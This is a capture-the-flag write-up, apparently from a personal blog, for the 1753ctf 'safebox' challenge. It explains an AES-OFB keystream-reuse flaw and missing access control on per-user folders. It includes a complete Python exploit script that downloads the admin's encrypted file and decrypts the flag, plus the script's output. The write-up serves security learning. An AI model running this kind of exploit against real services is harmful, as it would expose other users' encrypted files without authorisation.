---
title: safebox writeup
date: 2025-04-12
description: "writeup of the safebox challenge from 1753ctf"
tags: ["ctf","web","crypto","1753ctf"]
---

# Challenge description

Your files. Encrypted at rest. Premium accounts available soon. // careful, this app is resetting every 15 mintutes

source code:

[safebox](/files/safebox/safebox_src_index.js)


# Solution

we are presented with a site that allows us to register and upload files that will be encrypted (also we can't download them directly by pressing button as it is for 'premium' users only).

files are stored with per-user folders and ecrypted with AES-256-OFB mode. flag is stored in admin's directory

directories names are hashes of usernames, so admin folder is `sha256("admin")`

critical vulnerability is in the encryption implementation:

```javascript
    const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
    const iv = Buffer.from(process.env.ENCRYPTION_IV, 'hex');
```
```javascript
function encrypt(buffer, key, iv) {
    const cipher = crypto.createCipheriv('aes-256-ofb', key, iv);
    let encrypted = cipher.update(buffer);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted;
}
```
the same key and iv are used for encrypting all files accros all users. this means that the same keystream is reused as OFB mode generates it without ingering with the plaintext
https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)

xor operation is reversable so:

```
A ⊕ KEY = A_ENC -> KEY = A ⊕ A_ENC
B ⊕ KEY = B_ENC -> KEY = B ⊕ B_ENC
                    ^ these can be transformed to:  
A ⊕ A_ENC = B ⊕ B_ENC
A ⊕ A_ENC ⊕ B_ENC = B
```

so xor-ing the two encrypted files with known plaintext will give us the plaintext of the other file.

solve script in python:

```python
import requests
import hashlib
import json
import base64

BASE_URL = "https://safebox-1bbcbadc1e5d.1753ctf.com"

def register_user(username, password):
    response = requests.post(
        f"{BASE_URL}/api/register",
        json={"username": username, "password": password}
    )
    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f"registration failed: {response.text}")

def upload_known_file(token, filename, content):
    b64content = base64.b64encode(content).decode('utf-8')
    response = requests.post(
        f"{BASE_URL}/api/upload",
        headers={"x-token": token},
        json={"fileName": filename, "b64file": b64content}
    )
    if response.status_code != 200:
        raise Exception(f"upload failed: {response.text}")

def get_folder_hash(username):
    return hashlib.sha256(username.encode()).hexdigest()

def download_file(token, folder, filename):
    response = requests.get(
        f"{BASE_URL}/files/{folder}/{filename}",
        headers={"x-token": token}
    )
    if response.status_code == 200:
        return response.content
    else:
        raise Exception(f"download failed: {response.status_code}")

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def main():
    # to avoid collisions
    username = "hacker_" + hashlib.md5(str(hash(str)).encode()).hexdigest()[:8]
    password = "hackpass123"
    
    print(f"[+] registering user: {username}")
    user_data = register_user(username, password)
    token = user_data["token"]
    print(f"[+] got token: {token[:10]}...")
    
    #file with known content (all zeros)
    known_content = bytes([0] * 1000)
    filename = "known_file.txt"
    
    print("[+] uploading file with known content")
    upload_known_file(token, filename, known_content)
    
    #folder hash for current user and admin
    user_folder = get_folder_hash(username)
    admin_folder = get_folder_hash("admin")
    print(f"[+] user folder: {user_folder[:10]}...")
    print(f"[+] admin folder: {admin_folder[:10]}...")
    
    #download both encrypted files
    print("[+] downloading our encrypted file")
    encrypted_known = download_file(token, user_folder, filename)
    
    print("[+] downloading encrypted flag")
    encrypted_flag = download_file(token, admin_folder, "flag.txt")
    
    #XOR operations to recover the flag
    # 1. XOR the two encrypted files (cancels out the keystream)
    # 2. XOR with known content to get the flag
    xor_of_encrypted_files = xor_bytes(encrypted_flag, encrypted_known)
    flag_bytes = xor_bytes(xor_of_encrypted_files, known_content)
    
    print("[/] brrr hacking  ")
    #decode as UTF-8
    try:
        flag = flag_bytes.decode('utf-8').strip()
        print(f"[+] decrypted content of flag.txt: {flag}")
    except UnicodeDecodeError:
        print("[!] could not decode flag as UTF-8, printing as hex")
        print(f"[+] flag (hex): {flag_bytes.hex()}")

if __name__ == "__main__":
    main()
```

output:

```bash
[+] registering user: hacker_98fc1f6c
[+] got token: a1f60df5ff...
[+] uploading file with known content
[+] user folder: 221d40be95...
[+] admin folder: 8c6976e5b5...
[+] downloading our encrypted file
[+] downloading encrypted flag
[/] brrr hacking
[+] decrypted content of flag.txt: Well, good this file is encrypted, cause in any other
case someone could just come here and steal my valuable
flag. The flag is 1753c{encrypt3d_but_n0t_s0000_s4fe_b0x}. Cool, huh?

Yes it is!

Sincerely yours,
Mr. Admin
```




